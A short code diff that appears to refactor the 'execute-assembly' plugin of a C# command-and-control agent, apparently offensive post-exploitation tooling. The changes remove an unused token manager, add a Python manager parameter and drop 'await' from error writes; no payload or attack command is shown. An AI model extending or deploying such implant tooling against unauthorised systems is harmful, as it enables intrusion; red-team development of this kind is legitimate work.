@@ -10,13 +10,10 @@ namespace Agent
     {
         public string Name => "execute-assembly";
         private IMessageManager messageManager { get; set; }
-        private ITokenManager tokenManager { get; set; }
-        private List<ConsoleApplicationExecutor> Executors { get; set; }
-        private ConsoleApplicationExecutor cae;
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        private ConsoleApplicationExecutor? cae;
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
-            this.tokenManager = tokenManager;
         }
 
         public async Task Execute(ServerJob job)
@@ -25,7 +22,7 @@ namespace Agent
             {
                 if (this.cae.IsRunning())
                 {
-                    await messageManager.Write("Task is already running", job.task.id, true, "error");
+                    messageManager.Write("Task is already running", job.task.id, true, "error");
                     return;
                 }
             }
@@ -34,13 +31,13 @@ namespace Agent
 
             if (!args.Validate())
             {
-                await messageManager.Write("Missing Assembly Bytes", job.task.id, true, "error");
+                messageManager.Write("Missing Assembly Bytes", job.task.id, true, "error");
                 return;
             }
 
             if (messageManager.StdIsBusy())
             {
-                await messageManager.Write("Something already has StdOut captured", job.task.id, true, "error");
+                messageManager.Write("Something already has StdOut captured", job.task.id, true, "error");
                 return;
             }
 
